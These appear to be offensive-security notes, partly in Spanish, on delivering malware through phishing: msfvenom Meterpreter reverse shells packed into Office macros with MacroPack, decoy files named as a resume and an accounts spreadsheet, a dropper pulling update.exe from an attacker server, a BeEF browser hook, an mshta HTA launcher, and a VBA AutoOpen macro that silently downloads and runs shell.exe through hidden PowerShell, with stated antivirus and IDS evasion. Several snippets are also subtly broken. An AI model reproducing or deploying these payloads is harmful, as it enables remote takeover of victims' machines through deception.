### Generate a custom Meterpreter reverse shell macro

Learn how to use MacroPack to generate MS Office macros.

Develop a custom macro-based attack and the accompanying payloads.

Evade any A/V or IDS in place.

```bash
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER-SYSTEM-IP> -f vba | macro_pack.exe -o -G "resume.doc"

# Start multi handler

# start server python -m http.server 80

# Download file resume.doc
```

### Using a dropper to orchestrate your macro attacks

```bash
# python -m http.server 80

echo "http://10.100.11.15/update.exe" "update.exe" | macro_pack.exe -t DROPPER -o -G "Accounts2022.xls"

# Download file

```

## Establishing A Shell Through The Victim's Browser

```bash
# Beef
# en el html creamos un script que llame a un hoook de nuestro servidor beef
<head>
 <script src='http://kali/hook.js'></script>
</head>

```

### Automate the attack and put everything in a single attack vector

```bash
# cat myfile
$path = "C:\Program Files (x86)\Firefox Developer Edition\"
$path1 = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\"
ShellExecute($path & "firefox.exe", "http://<KALI-IP>", "", "", @SW_HIDE)
WinWait("[TITLE:Firefox Developer Edition]")
WinSetState ("[LAST]", "", @SW_HIDE)

# autoitscript lanzara un browser

# https://gist.github.com/anonymous/09f10cdb5d9b0bae4755850273083fd2

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=4444 -f exe > update.exe
# cp update.exe /var/www/html

# poner la opcion de notificaciones falsas para que el usuario descargue el script update.exe
```

```bash

#ActiveX  para ejecucion de macro
# pretexting
Office phish templates -> martinsohn


# Delivery & Execution
### Windows: File Smuggling with HTML and JavaScript
https://assets.ine.com/labs/ad-manuals/walkthrough-2396.pdf
### Client-side
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.4 LPORT=4444 -f exe > backdoor.exe

msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.15.4
set LPORT 4444
exploit

-> https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/
```

```bash

mshta.exe http://kali/poc.hta
##poc.hta
<head>
1script>
var payload = 'calc.exe'
new ActiveXObject('Wscript.Shell').Run(payload)
</script>
<head>
```

```bash
# Macro de Execl(WORD)

Sub AutoOpen()
  droppper
End Sub

Sub Document_Open()
  dropper
End Sub

Sub dropper()
  Dim url As String
  Dim psScript As String
  url = 'http://kali/shell.exe'
  #Download and execute file
  psScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Users\Admin\file.exe"";" & vbCrLf & _
    Start-Process -FilePath ""C:\Users\Admin\file.exe"""
  #Execute script using shell and hides the window for stealth

Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """, vbHide

End Sub
```
